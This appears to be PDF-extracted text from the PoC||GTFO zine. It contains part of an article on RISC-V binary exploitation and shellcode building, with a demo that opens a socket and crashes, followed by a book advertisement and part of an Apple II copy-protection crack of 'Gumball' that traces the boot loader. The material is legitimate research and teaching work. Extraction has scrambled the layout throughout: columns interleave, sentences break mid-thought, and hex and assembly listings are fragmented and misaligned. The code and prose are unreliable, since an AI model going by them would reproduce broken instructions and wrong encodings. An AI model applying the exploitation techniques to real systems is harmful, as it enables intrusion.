gp
tp
t0-2
s0/fp
s1
a0-1
a2-7
s2-11
t3-6
Description
Hard-wired to zero
Return address
Stack pointer
Global pointer
Thread pointer
Temporaries
Saved register/frame pointer
Saved register
Function arguments/return values
Function arguments
Saved registers
Temporaries
Saver
–
Caller
Callee
–
–
Caller
Callee
Callee
Caller
Caller
Callee
Caller
Figure 2. Naming conventions for general registers according to the current ABI.
Floating-Point Registers
ceptions are G and X. The G extension is actually a
mnemonic that represents the RISC-V architecture
extension set IMAFD, where I represents the base in-
teger instruction set, M represents multiply/divide, A
represents atomic instructions, F represents single-
precision floating point, and D represents double-
precision floating point. Thus, when one refers to
RVG, they are indicating the RISC-V (RV) set of
architecture extensions G, actually referring to the
combination IMAFD. 16
RISC-V also has 32 floating point registers fp0
through fp31, shown in Figure 3. The bit size of
these registers is not XLEN, but FLEN. FLEN refers
to the native floating point size, which is defined
by which floating point extensions are supported by
the implementation. If the ‘F’ extension is sup-
ported, only 32-bit floating point is implemented,
making FLEN=32. 13 If the ‘D’ extension is sup-
ported, 64-bit floating point numbers are supported,
making FLEN=64. 14 If the ‘Q’ extension is sup-
ported, quad-word floating point numbers are sup-
ported, and FLEN extends to 128. 15
This colloquialism also implies that there is no
specific architectural bit-space being singled out: all
three of the 32-bit, 64-bit, and 128-bit architectures
are being referenced. This is common in description
of the architectural standard, software relevant to all
architectures (a kernel port), or discussion about the
ISA. It is more common, in development, to see the
architecture described with the bit-space included
in the name, e.g. RV32G, RV64G, or RV128G.
Calling Convention
Like any Instruction Set Architecture (ISA), RISC-
V has a standard calling convention. But, because
of the RISC-V’s definition across multiple architec-
tural subclasses, there are actually three standard-
ized calling conventions: RVG, Soft Floating Point,
and RV32E.
It is also worth noting here that it is defined in
the specification and core register set that an im-
plementation of RISC-V can support all three bit-
spaces in a single processor, and that the state of the
processor can be switched at run-time by setting the
appropriate bit in the Machine ISA Register misa. 17
Naming Conventions RISC-V’s architecture is
somewhat reminiscent of the Plan 9 architecture
naming style, where each architecture is assigned a
specific alphanumeric A through Z or 0 through 9.
RISC-V supports 24 architectural extensions, one
for each letter of the English alphabet. The two ex-
Thus, in this context, the RVG calling conven-
tion denotes the model for linking one function to
another function in any of the three RISC-V bit-
spaces.
13 RISC-V
ISA Specification v2.1, Section 7.1, Page 39
ISA Specification v2.1, Section 8.1
15 RISC-V ISA Specification v2.1, Chapter 12, Paragraph 1
16 RISC-V Privileged Architecture Manual v1.9.1, Section 3.1.1, Page 18
17 Ibid.
18 RISC-V ISA Specification v2.1, Page 6, Paragraph 1
14 RISC-V
18Register
f0-7
f8-9
f10-11
f12-17
f18-27
f28-31
ABI Name
ft0-7
fs0-1
fa0-1
fa2-7
fs2-11
ft8-11
Description
FP temporaries
FP saved registers
FP arguments/return values
FP arguments
FP saved registers
FP temporaries
Saver
Caller
Callee
Caller
Caller
Callee
Caller
Figure 3. Floating point register naming convention according to the current ABI.
RVG RISC-V is little-endian by definition and big
or bi-endian systems are considered non-standard. 18
Thus, it should be presumed that all RISC-V im-
plementations are little-endian unless specifically
stated otherwise.
To call any given function there are two instruc-
tions: Jump and Link and Jump and Link Register.
These instructions take a target address and branch
to it unconditionally, saving the return address in a
specific register. To call a function whose address is
within 1MB of the caller’s address, the jal instruc-
tion can be used:
1 20400060:
661000 e f
being written to x0, the register will always read
as the value zero, effectively discarding the return
address.
j a l 20400 e c 0 <p r i n t k >
To call a function whose address is either gen-
erated dynamically, or is outside of the 1MB target
range, the jalr instruction must be used:
1 204001 ac :
204001 b0 :
0087 a783
000780 e7
lw
a5 , 8 ( a5 )
j a l r a5
In both of the above examples, bits 7 through
11 of the encoded opcode equate to 0b00001. These
bits indicate the destination register where the re-
turn address is stored. In this case, 1 is equivalent
to register x1, also known as the return address reg-
ister: ra. In this fashion, the callee can simply per-
form their specific functionality and return by using
the contents of the register ra.
Returning from a function is even simpler. In
the RISC-V ABI, we learned earlier that the return
address is presumed to be stored in ra, or, general
register x1. To return control to the address stored
in ra, we simply use the Jump and Link Register
instruction, with one slight caveat. When returning
from a function, the return address can be discarded.
So, the encoded destination register for jalr is x0.
We learned earlier that x0 is hardwired to the value
zero. This means that despite the return address
19• Manipulating application flow by attacking a
function-specific feature such as a function
pointer
Thus, a return instruction is colloquially:
204002 a8 :
00008067
ret
Soft-Float Calling Convention With regard to
the threat of exploitation, the RISC-V soft-float call-
ing convention has little effect on an attacker strat-
egy. The jal/jalr and stack conventions from RVG
persist. The only difference is that the floating point
arguments are passed in argument registers accord-
ing to their size. But, this typically has little ef-
fect on general exploitation theory and will only be
abused in the event that there is an application-
specific issue.
It is notable, however, that implementations
with hard-float extensions may be vulnerable to
memory corruption attacks. While hard-float im-
plementations use the same RVG calling conventions
as defined above, they use floating point registers
that are used to save and restore state within the
floating point ecosystem. This may provide an at-
tacker an opportunity to affect an application in an
unexpected manner if they are able to manipulate
saved registers (either in the register file or on the
stack).
While this is application specific and does not
apply to general exploitation theory, it is interesting
in that the RISC-V ABI does implement saved and
temporary registers specifically for floating point
functionality.
Which actually equates to the instruction:
1 204002 a8 :
00008067
j a l r ra , z e r o
Local stack space can be allocated in a simi-
lar fashion to any modern processing environment.
RISC-V’s stack grows downward from higher ad-
dresses, as is common convention. Thus, to allocate
space for automatics, a function simply decrements
the stack pointer by whatever stack size is required.
1 20402188 <arch_main >:
20402188:
fe010113
addi
3 2040218 c :
80000537
lui
2 0 4 0 2 1 9 0 : 80000637
lui
5 2 0 4 0 2 1 9 4 : 00112 e23 sw
7 20402220:
20402224:
9 20402228:
01 c1 20 83
02010113
00008067
sp , sp , −32
a0 , 0 x80000
a2 , 0 x80000
ra , 2 8 ( sp )
lw
ra , 2 8 ( sp )
a d d i sp , sp , 3 2
ret
In the above example, a standard addi instruc-
tion (highlighted in red) is used to both create and
destroy a stack frame of 32 bytes. Four of these bytes
are used to store the value of ra. This implies that
this function, arch_main, will make calls to other
functions and will require the use of ra. The lines
highlighted in green depict the saving and retrieval
of the return address value.
This fairly standard calling convention implies
that binary exploitation can be achieved, but has
several caveats. Like most architectures, the return
address can be overwritten in stack memory, mean-
ing that standard stack buffer overflows can result
in the control of execution. However, the return ad-
dress is only stored in the stack for functions that
make calls to other functions.
Leaf functions, functions that make no calls to
other functions, do not store their return address on
the stack. These functions, similar to other RISC
architectures, must be attacked by
RV32E Calling Convention It’s important to
note the RV32E calling convention, which is slightly
different from RVG. The E extension in RISC-V de-
notes changes in the architecture that are benefi-
cial for 32-bit Embedded systems. One could liken
this model to ARM’s Cortex-M as a variant of the
Cortex-A/R, except that RVG and RV32E are more
tightly bound.
RV32E only uses 16 general registers rather than
32, and never has a hard-floating point extension.
As a result, exploit developers can expect the call
and local stack to vary. This is because, with the
reduced number of general registers, there are less
argument registers, save registers, and temporaries.
• Overwriting the previous function’s stack
frame or stored return address
• 6 argument registers, x10 to x15.
• 2 save registers, x8 and x9.
• Overwriting the return address value in regis-
ter ra
• 3 temporary registers, x5 to x7.
20As is described earlier in this document, the gen-
eral RVG model is
Since the C extension is not a part of the
RVG IMAFD extension set, it is currently unknown
whether C will become a commonly implemented ex-
tension. Until RISC-V is more predominant and a
key player arises in chip manufacturing, exploit de-
velopers should either target their payloads for spe-
cific machines, or should focus on the uncompressed
instruction set.
• 8 argument registers.
• 12 save registers.
• 7 temporary registers.
Functions defined with numbers of arguments ex-
ceeding the argument register count will pass excess
arguments via the stack. In RV32E this will ob-
viously occur two arguments sooner, requiring an
adjustment to stack or frame corruption attacks.
Save and temporary registers saved to stack frames
may also require adjustments. This is especially true
when targeting kernels.
Observations
Exploitation really isn’t so different from other
RISC targets, such as ARM. Just like ARM, the
compression extension isn’t necessary for ROP, but
it can be handy for unintentionally encoded gadgets.
While mitigations like -fstack-protection[-all]
are supported, they require __stack_chk_{guard-
,fail}, which might be lacking on your target plat-
form. For Linux targets, be sure to enable PIE,
now, relro for ASLR and GOT hardening.
The ‘C’ Extension Effect
The RISC-V C (compression) extension can be con-
sidered similar to the Thumb variant of the ARM
ISA. Compression reduces instructions from 32 to 16
bits in size. For exploits where shellcode is used, or
Return Oriented Programming (ROP) is required,
the availability (or lack) of C will have a significant
effect on the effects of an implant.
An interesting side effect of the C extension is
that not all instructions are compressed. In fact, in
the Harvest OS kernel (a Lab Mouse Security pro-
prietary operating system), the compression exten-
sion currently only results in approximately 60% of
instructions compressed to 16 bits.
Because the processor must evaluate the type of
an instruction at every fetch (compressed or not)
when compression is available, there is a CISC-like
effect for exploitation. Valid compressed instruc-
tions may be encoded in the lower 16 bits of an ex-
isting 32-bit instruction. This means that someone,
for example, implementing a ROP attack against a
target may be able to find useful 16 bit opcodes em-
bedded in intentional 32-bit opcodes. This is similar
to a paper I wrote in 2002 that demonstrated that
ROP on CISC architectures (then called return-to-
text) could abuse long multi-byte opcodes to target
useful bytes that represented beneficial opcodes not
intended to be used by the compiler. 19
Building Shellcode
Building shellcode for any given architecture gener-
ally only requires understanding how to satisfy the
following abstractions:
• Allocating memory.
• Locating static data.
• Calling routines.
• Returning from routines.
Allocating Memory
Allocating memory in RISC-V environments is sim-
ilar to almost any other processing environment for
conventional operating systems. Since there is a
stack pointer register (sp/x2), the programmer can
simply take a chance and allocate memory via the
stack. This presumes that there is enough avail-
able memory in the system, and that a fault won’t
occur. If the exploitation target is a userland appli-
cation in a typical operating system, this is always a
reasonable gamble as even if allocating stack would
fault, the underlying OS will generally allocate an-
other page for the userland application. So, since
the stack grows down, the programmer only needs
to decrement the sp (round up to a multiple of 4
bytes) to create more space using system stack.
1 2 0 4 0 0 0 3 2 <l o c k _ u n l o c k >:
2 0 4 0 0 0 3 2 : 0 a 0 5 2 0 2 f amoswap . w . r l z e r o , z e r o , ( a0 )
3 2 0 4 0 0 0 3 6 : 4505
li
a0 , 1
2 0 4 0 0 0 3 8 : 8082
19 Sendmail
Prescan Exploitation and CISCO Encodings (127 Research & Development, 2002)
21Some environments may allocate thread-specific
storage, accessible through a structure stored in the
thread pointer (tp/x4). In this case, simply deref-
erence the structure pointed to by x4, and find the
pointer that references thread-local storage (TLS).
It’s best to store the pointer to TLS in a temporary
register (or even sp), to make it easier to abuse.
As with most programming environments, dy-
namic memory is typically also available, but must
be acquired through normal calling conventions.
The underlying mechanism is usually malloc, mmap,
or an analog of these functions.
erally write raw assembly code to build payloads, be-
cause it’s more elegant and it results in a much more
efficient application. This is my personal preference,
because it’s a demonstration of one’s connection to
the code, itself. However, it’s largely unnecessary.
In modern environments, many targets are 64-bit
and contain enough RAM to inject large payloads
containing encrypted blobs. As a result, one can
even write position independent code (PIC) appli-
cations in C (and even C++, if one dares). The
resultant binary image can be injected as its own
complete payload, and it runs perfectly well.
But, for constrained targets with little usable
scratch memory, primary loaders, or adversaries
with an artistic temperament, assembly will always
be the favorite tool of trade.
Locating Static Data
Data stored within shellcode must be referenced as
an offset to the shellcode payload. This is another
normal shellcode construct. Again, RISC-V is simi-
lar to any other processing environment in this con-
text. The easiest way to identify the address of
data in a payload is to find the address in mem-
ory of the payload, or to write assembly code that
references data at position independent offsets. The
latter is my preferred method of writing shellcode,
as it makes the most engineering sense. But, if
you prefer to build address offsets within executable
images, the usual shellcode self-calling convention
works fine:
2
4
6
8
10
Calling Routines
Earlier in this document, I described the general
RISC-V calling convention. Arguments are placed
in the aN registers, with the first argument at a0, sec-
ond at a1, and so-forth. Branching to another rou-
tine can be done with the jump-and-link (jal) in-
struction, or with the jump-and-link register (jalr)
instruction. The latter instruction has the absolute
address of the target routine stored in the regis-
ter encoded into the instruction, which is a normal
RISC convention. This will be the case for any ap-
plication routine called by your shellcode.
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 <l o l >:
0:
0100006 f
j
10 <bounce>
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 4 <l o l 2 >:
4:
00000513
li
a0 , 0
8:
0000 a583 lw
a1 , 0 ( r a )
c:
00000073
ecall
0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 <bounce >:
10:
ff5ff0ef
jal
ra , 4 <l o l 2 >
0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 4 <data >:
1 4 : 0304
a d d i s1 , sp , 3 8 4
1 6 : 0102
slli
sp , sp , 0 x0
The Linux syscall convention, in the context of
RISC-V, is likely similar to other general purpose
operating systems running on RISC-V processors.
The Linux model deviates from the generic calling
convention by using the ecall instruction. This in-
struction, when executed from userland, initiates a
trap into a higher level of privilege. This trap is
processed as, of course, a system call, which allows
the kernel running at the higher layer of privilege to
process the request appropriately.
As you can see in the above code example, the
first instruction performs a jump to the last instruc-
tion prior to static data. The last instruction is a
jump-and-link instruction, which places the return
address in ra. The return address, being the next
instruction after jump-and-link, is the exact address
in memory of the static data. This means that we
can now reference chunks of that data as an offset
of the ra register, as seen in the load-word instruc-
tion above at address 0x08, which loads the value
0x01020304 into register a1.
It’s notable, at this point, to make a comment
about shellcode development in general. Artists gen-
System call numbers are encoded into register
a7. Other arguments are encoded in the standard
fashion, in registers a0 through a6. System calls
exceeding seven arguments are stored on the stack
prior to the call. This convention is also true of
general routine calls whose argument totals exceed
available argument registers.
22Returning from Routines Putting it Together
Passing arguments back from a routine is simple,
and is, again, similar to any other conventional pro-
cessing environment. Arguments are passed back in
the argument register a0. Or, in the argument pair
a0 and a1, depending on the context.
This is also true of system calls triggered by the
ecall instruction. Values passed back from a higher
layer of privilege will be encoded into the a0 regis-
ter (or a0 and a1). The caller should retrieve values
from this register (or pair) and treat the value prop-
erly, depending on the routine’s context.
One notable feature of RISC-V is its compare-
and-branch methodology. Branching can be accom-
plished by encoding a comparison of registers, like
other RISC architectures. However, in RISC-V,
two specific registers can be compared along with
a target in the event that the comparison is equiva-
lent. This allows very streamlined evaluation of val-
ues. For example, when the standard system call
mmap returns a value to its caller, the caller can
check for mmap failure by comparing a0 to the zero
register and using the branch-less-than instruction.
Thus, the programmer doesn’t actually need multi-
ple instructions to effect the correct comparison and
branch code block; a single instruction is all that is
required. The following example performs all actions de-
scribed in previous sections. It allocates 80 bytes
of memory on the stack, room for ten 64-bit words.
It then uses the aforementioned bounce method to
acquire the address of the static data stored in the
payload. The system call for socket is then called
by loading the arguments appropriately.
After the system call is issued, the return value
is evaluated. If the socket call failed, and a negative
value was returned, the _open_a_socket function is
looped over.
If the socket call does succeed, which it likely
will, the application will crash itself by calling a
(presumably) non-existent function at virtual ad-
dress 0x00000000.
As an example, the byte stored in static memory
is loaded as part of the system call, only to demon-
strate the ability to load code at specific offsets.
1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 <l o l >:
0:
f b 0 1 0 1 1 3 a d d i sp , sp , −80
3 4:
00113023 sd
ra , 0 ( sp )
8:
00813423 sd
s0 , 8 ( sp )
5 c:
0200006 f
j
2 c <bounce>
0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 <_open_a_socket >:
7 10:
00200513
li
a0 , 2
14:
00100593
li
a1 , 1
9 18:
00600613
li
a2 , 6
1c :
00008883 l b
a7 , 0 ( r a )
11 2 0 :
00000073
ecall
0 0 0 0 0 0 0 0 0 0 0 0 0 0 2 4 <_crash_or_loop >:
13 2 4 :
fe0546e3
b l t z a0 , 1 0 <_open_a_socket>
0 0 0 0 0 0 0 0 0 0 0 0 0 0 2 8 <_crash >:
15 2 8 :
00000067
jr
zero
0 00 00 0 00 0 00 00 0 2 c <bounce >:
17 2 c :
fe5ff0ef
jal
ra , 1 0 <_open_a_socket>
0 0 0 0 0 0 0 0 0 0 0 0 0 0 3 0 <data >:
19 3 0 : 00 c6
slli
ra , ra , 0 x11
–——–
———
—–—–
Big shout out to #plan9 for still existing after 17
years, TheNewSh for always rocking the mic, Travis
Goodspeed for leading the modern zine revolution,
RMinnich for being an excellent resource over the
past decade, RPike for being an excellent role model,
and my baby Pierce, for being my inspiration.
Source code and shellcode for this article
are available attached to this PDF and through
Github. 20
20 git
clone https://github.com/donbmouse/riscv-security || unzip pocorgtfo15.pdf riscv-security.zip
23I
Dearest neighbors,
n 19th century America, there were these
books made just for the frontiersman who
couldn’t carry a library. The idea was that
if you were setting out to homestead in the
wild blue yonder, one properly assembled book could
teach you everything you needed to know that wasn’t
told in the family bible. How to make ink from the
green husks around walnuts, how to grow food from
wild seeds, and how to build a shelter from scruffy little
trees when there’s not yet time to fell hardwood. You
might even learn to make medicines, though I’d cau-
tion against any recipes involving nightshade or mer-
cury.
Now that the 21st century and its newfangled ways
are upon, the fine folks at No Starch Press have seen
fit to print the collected works of PoCkGTFO, our
first nine releases in one classy tome, bound in the
finest faux leather on nearly eight hundred pages of
thin paper with a ribbon to keep your place while
studying. You will see practical examples of how to
write exploits for ancient and modern architectures,
how to patch emulators to prototype hardware back-
doors that would be beyond a hobbyist’s budget, and
how to break bad cryptography. You will learn more
about file formats than you every believed possible,
and a little about how to photograph microchips and
circuit boards for reverse engineering.
This fine collection was carefully indexed and cross-
referenced, with twenty-four full color pages of Ange
Albertini’s file format illustrations to help understand
our polyglots. It’s available for just $30 plus shipping,
with the option of a free pickup at Defcon.
Your neighbor,
Pastor Manul Laphroaig
PoC||
G
TFO
https://nostarch.com/gtfo15:06
Gumball
by 4am and Peter Ferrie (qkumba, san inc)
Name Gumball
This is decidedly not a single-load game. There
is a classic crack that is a single binary, but it cuts
out a lot of the introduction and some cut scenes
later. All other cracks are whole-disk, multi-loaders.
Combined with the early indications of a custom
bootloader and 4-4 encoded sectors, this is not go-
ing to be a straightforward crack by any definition
of “straight” or “forward.”
Let’s start at the beginning.
Genre arcade
Year 1983
Credits by Robert Cook, concept by Doug Carl-
ston
Publisher Broderbund Software
Platform Apple ][+ or later (48K)
Media single-sided 5.25-inch floppy
OS custom
In Which We Brag About Our Humble
Beginnings
Other versions
• Mr. Krac-Man & The Disk Jockey
• several uncredited cracks
I have two floppy drives, one in slot 6 and the other
in slot 5. My “work disk” (in slot 5) runs Diversi-
DOS 64K, which is compatible with Apple DOS 3.3
but relocates most of DOS to the language card on
boot. This frees up most of main memory (only us-
ing a single page at $BF00..$BFFF), which is useful
for loading large files or examining code that lives
in areas typically reserved for DOS.
In Which Various Automated Tools
Fail In Interesting Ways
[S6,D1=original disk]
[S5,D1=my work disk]
The floppy drive firmware code at $C600 is re-
sponsible for aligning the drive head and reading
sector 0 of track 0 into main memory at $0800. Be-
cause the drive can be connected to any slot, the
firmware code can’t assume it’s loaded at $C600. If
the floppy drive card were removed from slot 6 and
reinstalled in slot 5, the firmware code would load
at $C500 instead.
To accommodate this, the firmware does some
fancy stack manipulation to detect where it is in
memory (which is a neat trick, since the 6502 pro-
gram counter is not generally accessible). However,
due to space constraints, the detection code only
cares about the lower 4 bits of the high byte of its
own address.
Stay with me, this is all about to come together
and go boom.
$C600 (or $C500, or anywhere in $Cx00) is read-
only memory. I can’t change it, which means I
can’t stop it from transferring control to the boot
sector of the disk once it’s in memory. BUT! The
disk firmware code works unmodified at any address.
Any address that ends with $x600 will boot slot 6,
including $B600, $A600, $9600, &c.
COPYA immediate disk read error
Locksmith Fast Disk Backup unable to read
any track
EDD 4 bit copy (no sync, no count) Disk
seeks off track 0, then hangs with the drive
motor on
Copy II+ nibble editor
• T00 has a modified address prologue (D5
AA B5) and modified epilogues
• T01+ appears to be 4-4 encoded data
(2 nibbles on disk = 1 byte in memory)
with a custom prologue/ delimiter. In
any case, it’s neither 13 nor 16 sectors.
Disk Fixer not much help
Why didn’t COPYA work? not a 16-sector disk
Why didn’t Locksmith FDB work? ditto
Why didn’t my EDD copy work? I don’t know.
Early Broderbund games loved using half
tracks and quarter tracks, not to mention
the runtime protection checks, so it could be
literally anything. Or, more likely, any com-
bination of things.
25*9600<C600.C6FFM copy drive firmware to $9600
*9600G and execute it
020F
0211
0212
0214
0215
0217
0219
021B
021D
021F
0220
0223
0224
0225
0227 A0 AB
98
85 3C
4A
05 3C
C9 FF
D0 09
C0 D5
F0 05
8A
99 00 08
E8
C8
D0 EA
84 3D
0229
022B
022D 84 26
A9 03
85 27
instead of jumping to on-disk
code, copy boot sector to
higher memory so it survives
a reboot 022F
0231 A6 2B
20 5D 02
turn off slot 6 drive motor 025D
025E
025F
0262
0264
0266
0268
026B
026D
026F
0271
0272
0275
. . .reboots slot 6, loads game. . .
Now then:
]PR#5 . . .
]CALL -151
*9600<C600.C6FFM
*96F8L
96F8 4C 01 08
JMP $0801
That’s where the disk controller ROM code ends
and the on-disk code begins. But $9600 is part of
read/write memory. I can change it at will. So I can
interrupt the boot process after the drive firmware
loads the boot sector from the disk but before it
transfers control to the disk’s bootloader.
96F8
96FA
96FD
9700
9701 A0 00
B9 00 08
99 00 28
C8
D0 F7 LDY
LDA
STA
INY
BNE
#$00
$0800,Y
$2800,Y
9703 AD E8 C0 LDA $C0E8
reboot to my work disk in slot
5
In Which We Get To Dip Our Toes
Into An Ocean Of Raw Sewage
0277
0279
027B
027C
027E
0280
0282
0284
0286
0288
028B
028D
028E
0290
0293
0295
0297
0298
029A
029B
029D
029F
02A1
02A3
02A5
02A8
]CALL -151
copy code back to $0800
where it was originally loaded,
to make it easier to follow
*800<2800.28FFM
801L
LDX
LDA
STA
INX
BNE
JMP
#$00
$0800,X
$0200,X
immediately move this code
to the input buffer at $0200
$0803
$020F
OK, I can do that too. Well, mostly. The page at
$0200 is the text input buffer, used by both Apple-
soft BASIC and the built-in monitor (which I’m in
right now). But I can copy enough of it to examine
this code in situ.
$3C
$3C
#$FF
$0224
#$D5
$0224
$0800,Y
$0211
$3D
STY $26
LDA #$03
STA $27 #$00 into zero page $26 and
#$03 into $27 means we’re
probably going to be loading
data into $0300..$03FF later,
because ($26) points to $0300.
LDX $2B
JSR $025D zero page $2B holds the boot
slot x16
18
08
C0
FB
D5
F7
C0
FB
AA
F3
EA
C0
FB CLC
PHP
LDA
BPL
EOR
BNE
LDA
BPL
CMP
BNE
NOP
LDA
BPL read a sector from track $00
(this is actually derived from
the code in the disk controller
ROM routine at $C65C, but
looking for an address
prologue of “D5 AA B5” instead
of “D5 AA 96”) and using the
nibble translation table we set
up earlier at $0800
C9 B5
F0 09
28
90 DF
49 AD
F0 1F
D0 D9
A0 03
84 2A
BD 8C C0
10 FB
2A
85 3C
BD 8C C0
10 FB
25 3C
88
D0 EE
28
C5 3D
D0 BE
B0 BD
A0 9A
84 3C
BC 8C C0
10 FB CMP
BEQ
PLP
BCC
EOR
BEQ
BNE
LDY
STY
LDA
BPL
ROL
STA
LDA
BPL
AND
DEY
BNE
PLP
CMP
BNE
BCS
LDY
STY
LDY
BPL
BD 8C
10
49
D0
BD 8C
10
C9
D0
BD 8C
10
*20F<80F.8FFM
*20FL
21 If
set up a nibble translation
table at $0800
*25DL
Now we get to 21 trace the boot process one sec-
tor, one page, one instruction at a time.
A2 00
BD 00 08
9D 00 02
E8
D0 F7
4C 0F 02
#$AB
$96FA
9706 4C 00 C5
JMP $C500
*9600G
. . .reboots slot 6. . .
. . .reboots slot 5. . .
]BSAVE BOOT0,A$2800,L$100
0801
0803
0806
0809
080A
080C
LDY
TYA
STA
LSR
ORA
CMP
BNE
CPY
BEQ
TXA
STA
INX
INY
BNE
STY
you replace the words “need to” with the words “get to,” life becomes amazing.
26
$C08C,X
$025F
#$D5
$025F
$C08C,X
$0268
#$AA
$0264
$C08C,X
$0272
#$B5
$0284
$025D
#$AD
$02A1
$025D
#$03
$2A
$C08C,X
$0288
$3C
$C08C,X
$0290
$3C
$0288
$3D
$025D
$025E
#$9A
$3C
$C08C,X
$02A5
#$B5 for third prologue
nibble02AA
02AD
02AF
02B0
02B3
02B5
02B7
02BA
02BC
02BF 59 00 08
A4 3C
88
99 00 08
D0 EE
84 3C
BC 8C C0
10 FB
59 00 08
A4 3C
02C1
02C3
02C4 91 26
C8
D0 EF
02C6
02C9
02CB
02CE
02D0
BC 8C
10
59 00
D0
C0
FB
08
8D
60
EOR
LDY
DEY
STA
BNE
STY
LDY
BPL
EOR
LDY
$0800,Y
$3C
$0800,Y
$02A3
$3C
$C08C,X
$02B7
$0800,Y
$3C
use the nibble translation
table we set up earlier to
convert nibbles on disk into
bytes in memory
STA ($26),Y
INY
BNE $02B5 store the converted bytes at
$0300
LDY
BPL
EOR
BNE
RTS verify the data with a
one-nibble checksum
$C08C,X
$02C6
$0800,Y
$025D
Continuing from $0234. . .
*234L
0234 20 D1 02
*2D1L JSR $02D1 02D1
02D2
02D4
02D7
02D8
02DB
02DC
02DF
02E1
02E3
02E4
02E5
02E6
02E8
02EA
02EB
02EC
02EE
02F0
02F2 A8
A2 00
B9 00 08
4A
3E CC 03
4A
3E 99 03
85 3C
B1 26
0A
0A
0A
05 3C
91 26
C8
E8
E0 33
D0 E4
C6 2A
D0 DE TAY
LDX
LDA
LSR
ROL
LSR
ROL
STA
LDA
ASL
ASL
ASL
ORA
STA
INY
INX
CPX
BNE
DEC
BNE 02F4
02F7 CC 00 03
D0 03 CPY $0300
BNE $02FC verify final checksum
02F9 60 RTS checksum passed, return to
caller and continue with the
boot process
02FC
4C 2D FF
finish decoding nibbles
#$00
$0800,Y
$03CC,X
$0399,X
$3C
($26),Y
In Which We Do A Bellyflop Into A
Decrypted Stack And Discover That I
Am Very Bad At Metaphors
$3C
($26),Y
#$33
$02D4
$2A
$02D2
JMP $FF2D
*9600<C600.C6FFM
checksum failed, print “ERR”
and exit
4C 01 03
JMP $0301
A9
8D 38
A9
8D 39
LDA
STA
LDA
STA
#$05
$0838
#$97
$0839
9702 4C 01 08 JMP $0801 start the boot
9705
9707
970A
970D
970E A0 00
B9 00 03
99 00 23
C8
D0 F7 LDY
LDA
STA
INY
BNE (callback is here) copy the
code at $0300 to higher
memory so it survives a
reboot
#$00
$0300,Y
$2300,Y
$9707
9710 AD E8 C0
LDA $C0E8
9713 4C 00 C5
JMP $C500
*BSAVE TRACE,A$9600,L$116
*9600G
. . .reboots slot 6. . .
. . .reboots slot 5. . .
]BSAVE BOOT1
0300-03FF,A$2300,L$100
]CALL -151
*2301L
2301
84 48
STY $48
Continuing from $0237. . .
0237
05
08
97
08
jump into the code we just
read
This is where I get to interrupt the boot, before
it jumps to $0301.
27
patch boot0 so it calls my
routine instead of jumping to
$0301
96F8
96FA
96FD
96FF
turn off slot 6 drive motor
and reboot to my work disk
in slot 5clear hi-res graphics screen 2
2303
2305
2306
2308
230B
230C
230E
2311
2312 A0 00
98
A2 20
99 00 40
C8
D0 FA
EE 0A 03
CA
D0 F4 LDY
TYA
LDX
STA
INY
BNE
INC
DEX
BNE #$00 2314
2317
231A
231D AD
AD
AD
AD C0
C0
C0
C0 LDA
LDA
LDA
LDA $C057
$C052
$C055
$C050 and show it (appears blank)
2320
2323
2325
2328
2329 B9 00 03
45 48
99 00 01
C8
D0 F5 LDA
EOR
STA
INY
BNE $0300,Y
$48
$0100,Y decrypt the rest of this page
to the stack page at $0100
232B
232D A2 CF
9A 232E 60
57
52
55
50
#$20
$4000,Y
$2308
$030A
set the stack pointer
RTS and exit via RTS
#$05
$0838
#$97
$0839
patch boot0 so it calls my
routine instead of jumping to
$0301
96F8
96FA
96FD
96FF A9
8D 38
A9
8D 39 9702 4C 01 08 JMP $0801 start the boot
9705
9707
970A
970D
970E A0 00
B9 00 03
99 00 23
C8
D0 F7 LDY
LDA
STA
INY
BNE (callback is here) copy the
code at $0300 to higher
memory so it survives a
reboot
9710
9713 AD E8 C0
4C 00 C5 LDA $C0E8
JMP $C500
#$00
$0300,Y
$2300,Y
232E 60
decrypt the rest of this page
to the stack page at $0100
$2320
LDX #$CF
TXS set the stack pointer
RTS and exit via RTS
*BLOAD TRACE
[first part is the same as the
previous trace]
9705
84 48
STY $48
reproduce the decryption
9707
A0 00
LDY #$00
loop, but store the result at
9709 B9 00 03
LDA $0300,Y $2100 so it survives a reboot
970C
45 48
EOR $48
970E 99 00 21
STA $2100,Y
9711
C8
INY
9712
D0 F5
BNE $9709
$9707
2303
2305
2306
2308
230B
230C
230E
2311
2312 A0 00
98
A2 20
99 00 40
C8
D0 FA
EE 0A 03
CA
D0 F4 LDY
TYA
LDX
STA
INY
BNE
INC
DEX
BNE #$00
2314
2317
231A
231D AD
AD
AD
AD LDA
LDA
LDA
LDA $C057
$C052
$C055
$C050
C0
C0
C0
C0
A2 CF
9A
$0300,Y
$48
$0100,Y
Mischief Managed
turn off slot 6 drive motor
and reboot to my work disk
in slot 5
9714
9717
*BSAVE TRACE,A$9600,L$116
*9600G
. . .reboots slot 6. . .
. . .reboots slot 5. . .
]BSAVE BOOT1
0300-03FF,A$2300,L$100
]CALL -151
*2301L
2301
84 48
STY $48
57
52
55
50
232B
232D
LDA
EOR
STA
INY
BNE
Oh joy, stack manipulation. The stack on
an Apple II is just $100 bytes in main memory
($0100..$01FF) and a single byte register that
serves as an index into that page. This allows for
all manner of mischief—overwriting the stack page
(as we’re doing here), manually changing the stack
pointer (also doing that here), or even putting exe-
cutable code directly on the stack.
The upshot is that I have no idea where exe-
cution continues next, because I don’t know what
ends up on the stack page. I get to interrupt the
boot again to see the decrypted data that ends up
at $0100.
$2320
LDX #$CF
TXS
LDA
STA
LDA
STA
B9 00 03
45 48
99 00 01
C8
D0 F5
$2308
*9600<C600.C6FFM
05
08
97
08
2320
2323
2325
2328
2329
AD E8 C0
4C 00 C5
LDA $C0E8
JMP $C500
*BSAVE TRACE2,A$9600,L$11A
*9600G
. . .reboots slot 6. . .
. . .reboots slot 5. . .
]BSAVE BOOT1
0100-01FF,A$2100,L$100
]CALL -151
clear hi-res graphics screen 2
#$20
$4000,Y
$2308
$030A
$2308
and show it (appears blank)
28
turn off drive motor and
reboot to my work diskThe original code at $0300 manually reset the
stack pointer to #$CF and exited via RTS. The Ap-
ple II will increment the stack pointer before using
it as an index into $0100 to get the next address.
(For reasons I won’t get into here, it also increments
the address before passing execution to it.)
*21D0.
